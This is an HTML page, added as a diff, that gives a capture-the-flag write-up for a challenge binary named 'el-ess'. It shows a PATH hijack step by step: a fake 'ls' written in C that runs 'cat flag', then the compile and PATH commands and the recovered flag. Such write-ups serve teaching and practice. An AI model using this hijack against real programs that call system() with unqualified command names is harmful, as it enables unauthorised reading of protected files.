@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>el-ess</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+<h1 align="center">CTF2</h1>
+  <h2 class="qsn">el-ess</h2>
+  <h5>Binary and flag files can be found <a href="">here</a></h5>
+  <p>'C' code is not provided, but only binary and flag file are given.<br>You can find the disassembled <b>'main'</b> function <a href="">here</a>.<br/><br/>
+    When we run the program ,it prints :
+    <pre class="code">gdb-peda$ run
+Starting program: /home/pwnme/el-ess/el-ess 
+============================================================
+EL-ESS -- a drop-in replacement for ls
+============================================================
+Enter path:</pre>
+   When we provide path to any directory ,it prints it's content.
+    For example, if I provide '/tmp/amit' as my input:
+    <pre class="code">gdb-peda$ run
+Starting program: /home/pwnme/el-ess/el-ess 
+============================================================
+EL-ESS -- a drop-in replacement for ls
+============================================================
+Enter path: /tmp/amit
+[New process 1662]
+process 1662 is executing new program: /bin/dash
+[New process 1663]
+process 1663 is executing new program: /bin/ls
+feedback   feedback2	  getName_input1  ls.c			 peda-session-you think you know bash???.txt  shellcode01  you think you know bash???
+feedback1  getName_input  ls		  peda-session-dash.txt  shell					      shellcode.s
+[Inferior 3 (process 1663) exited normally]</pre>
+    It executes the command <b>$ls path</b>.And ,to get the flag, we want it to execute <b>$cat flag</b>.<br/>So, what if we somehow define <b>ls</b> to be <b>cat</b> ! Sounds interesting ,isn't it?
+    So now,I am going to write a 'C' code in <b>/tmp/amit</b> directory which makes a system call,to read the content of file 'flag'.
+    <pre class="code">ctf2@ip-172-31-4-22:/tmp/amit$ cd /tmp/amit
+ctf2@ip-172-31-4-22:/tmp/amit$ vim ls.c</pre>
+    And in 'ls.c',we write:
+    <pre class="code">#include &ltstdio.h&gt
+#include &ltstring.h&gt
+
+int main ()
+{
+   char command[]={"/bin/cat flag"};
+   system(command);
+
+   return(0);
+}
+</pre>
+    Now ,let's compile it and store the result in file named 'ls':
+    <pre class="code">ctf2@ip-172-31-4-22:/tmp/amit$ gcc ls.c -o ls</pre>
+    
+    Now ,declare <b>PATH environment variable</b> to be this directory:
+    <pre class="code">ctf2@ip-172-31-4-22:/tmp/amit$ PATH=/tmp/amit</pre>
+    Let's go back to our directory where our binary and flag are located.And then execute the program.
+    <pre class="code">ctf2@ip-172-31-4-22:~/el-ess$ ./el-ess 
+============================================================
+EL-ESS -- a drop-in replacement for ls
+============================================================
+Enter path: anything_will_work
+2t1ll_34$Y_fl49_1$/\/7_17_?
+ctf2@ip-172-31-4-22:~/el-ess$ </pre>
+    We got the flag,let's dance :P
+  
+  
+  
+  
+  
+  </p>
+  
+
+</body>
+</html>
